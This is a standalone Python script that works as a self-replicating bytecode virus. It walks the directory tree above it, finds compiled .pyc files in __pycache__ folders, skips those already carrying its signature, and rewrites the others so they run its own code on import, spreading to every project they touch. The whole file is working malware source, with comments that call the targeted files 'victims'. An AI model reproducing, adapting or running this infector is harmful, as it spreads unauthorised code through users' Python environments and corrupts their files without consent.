#!/usr/bin/env python3

def main_wrapper():
    # Conventional imports are legal, but pycompile has an unfortunate tendency to optimise these out into the
    # module body. This rather complicates replication, so it's best to just avoid it
    dis, os, marshal, struct, sys, time, random, types, codecs, string, tempfile, py_compile = [
        __import__("dis"), __import__("os"), __import__("marshal"), __import__("struct"), __import__("sys"),
        __import__("time"), __import__("random"), __import__("types"), __import__("codecs"), __import__("string"),
        __import__("tempfile"), __import__("py_compile")]

    # Check to see if we've already run, don't continue if so
    if os.environ.get("iridiumscorpion"):
        print("Infector has already been run under this interpreter")
        return
    else:
        os.environ["iridiumscorpion"]="true"

    py_version = "".join([str(a) for a in sys.version_info[:2]])

    # I'm picky about hex representation, what can I say? Magic is truncated because the last two bytes are always \r\n.
    # Note that the magic is meant to be interpreted as a LE uint, but there's not much point here
    magic_hex = lambda x: ''.join(["%02X" % a for a in x])[:4]

    # Find our file, compile it if it's not already compiled
    this_path = os.path.abspath(__file__)
    compiled_file_name = this_path
    compiled_file_temp = False
    if this_path.endswith(".pyc"):
        print(this_path)
    else:
        with tempfile.NamedTemporaryFile("r", delete=False) as f:
            compiled_file_name, compiled_file_temp = f.name, True
        py_compile.compile(this_path, compiled_file_name)
        print("{} -> {}".format(this_path, compiled_file_name))

    # Load the compiled file, pull the contents out
    with open(compiled_file_name, "rb") as f:
        this_magic, this_moddate, this_source_size = f.read(4), f.read(4), f.read(4)
        this_module = marshal.load(f)

    # Leaving suspicious files everywhere is impolite
    if compiled_file_temp:
        os.remove(compiled_file_name)

    # Look for last method in the constant list. It'll always be us!
    for c in list(this_module.co_consts):
        if type(c) == types.CodeType:
            this_method = c

    # Look for potential victims under __pycache__
    for path, dirs, files in os.walk(".."):
        for file in files:
            target_file = os.path.abspath(path + "/" + file)
            if path.endswith("__pycache__") and file.endswith(".pyc") and (file[-6:-4]==py_version or not file[-6].isnumeric()):
                print(target_file)

                if target_file==this_path:
                    print("    Same as source binary")
                    continue

                with open(target_file, "rb") as f:
                    magic, moddate, source_size = f.read(4), f.read(4), f.read(4)
                    module = marshal.load(f)

                if magic!=this_magic:
                    print("    Target module mismatch ({} v {})".format(magic_hex(magic), magic_hex(this_magic)))
                    continue
                # Check for LOAD_CONST/LOAD_CONST/MAKE_FUNCTION/CALL_FUNCTION. Let's use it as our signature!
                elif int(py_version)<36 and module.co_code[0]==0x64 and module.co_code[3]==0x64 and module.co_code[6]==0x84 and module.co_code[9]==0x83:
                    print("    Module likely already infected")
                    continue
                elif int(py_version)==36 and module.co_code[0]==0x64 and module.co_code[2]==0x64 and module.co_code[4]==0x84 and module.co_code[6]==0x83:
                    print("    Module likely already infected")
                    continue
                else:
                    print("    Infecting module (v {})".format(magic_hex(magic)))

                new_method_name = "".join([random.choice(string.ascii_lowercase) for x in range(255)])

                # Two additions to the constant list: This method, and a randomly generated name
                new_constants = list(module.co_consts)
                new_constants.extend([this_method, new_method_name])
                if int(py_version)>35:
                    # LOAD_CONST fn   (00) 64 xx
                    # LOAD_CONST name (02) 64 xx
                    # MAKE_FUNCTION 0 (04) 84 00
                    # CALL_FUNCTION 0 (06) 83 00
                    # POP_TOP         (08) 01 00
                    new_bytecode = struct.pack("=BBBBBBBBBB", 0x64, len(new_constants)-2, 0x64, len(new_constants)-1, 0x84, 0, 0x83, 0, 1, 0)
                else:
                    # LOAD_CONST fn   (00) 64 xxxx
                    # LOAD_CONST name (03) 64 xxxx
                    # MAKE_FUNCTION 0 (06) 84 0000
                    # CALL_FUNCTION 0 (09) 83 0000
                    # POP_TOP         (0C) 01
                    new_bytecode = struct.pack("=BHBHBHBHB", 0x64, len(new_constants)-2, 0x64, len(new_constants)-1, 0x84, 0, 0x83, 0, 1)

                module_out = types.CodeType(
                    module.co_argcount,
                    module.co_kwonlyargcount,
                    module.co_nlocals,
                    module.co_stacksize,
                    module.co_flags,
                    new_bytecode+module.co_code,
                    tuple(new_constants),
                    module.co_names,
                    module.co_varnames,
                    module.co_filename,
                    module.co_name,
                    module.co_firstlineno,
                    bytes([len(new_bytecode)]) + b"\x00" + module.co_lnotab, # No line number change, offset bytecode by length of insertion
                    module.co_freevars,
                    module.co_cellvars)

                with open(target_file, "wb") as f:
                    f.write(magic)
                    f.write(moddate)
                    f.write(source_size)
                    marshal.dump(module_out, f)

main_wrapper()
